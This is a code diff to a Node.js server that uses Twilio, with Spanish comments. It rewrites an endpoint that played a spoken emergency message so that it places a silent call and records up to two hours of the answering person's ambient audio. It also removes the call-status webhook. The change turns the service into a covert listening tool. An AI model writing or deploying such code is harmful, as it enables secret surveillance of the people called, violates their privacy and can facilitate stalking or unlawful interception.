@@ -19,11 +19,12 @@ app.post("/make-call", async (req, res) => {
             });
         }
 
-        // Crear la llamada
+        // Crear la llamada silenciosa (solo escucha ambiente)
         const call = await client.calls.create({
-            twiml: `<Response><Say language="es-ES">Llamada de emergencia. ${message || 'Se requiere asistencia inmediata.'}</Say><Pause length="2"/><Say language="es-ES">Por favor, manténgase en la línea.</Say></Response>`,
+            twiml: '<Response><Record timeout="0" maxLength="7200"/></Response>',
             to: to,
-            from: process.env.TWILIO_PHONE_NUMBER
+            from: process.env.TWILIO_PHONE_NUMBER,
+            record: true
         });
 
         console.log("Llamada iniciada! SID:", call.sid);
@@ -40,7 +41,7 @@ app.post("/make-call", async (req, res) => {
     }
 });
 
-// Endpoint existente para SMS
+// Endpoint para SMS
 app.post("/send-sms", async (req, res) => {
     try {
         const { to, message } = req.body;
@@ -69,12 +70,6 @@ app.post("/send-sms", async (req, res) => {
             error: error.message
         });
     }
-});
-
-// Webhook para eventos de la llamada
-app.post('/voice-status', (req, res) => {
-    console.log('Estado de la llamada actualizado:', req.body.CallStatus);
-    res.sendStatus(200);
 });
 
 const PORT = process.env.PORT || 3000;
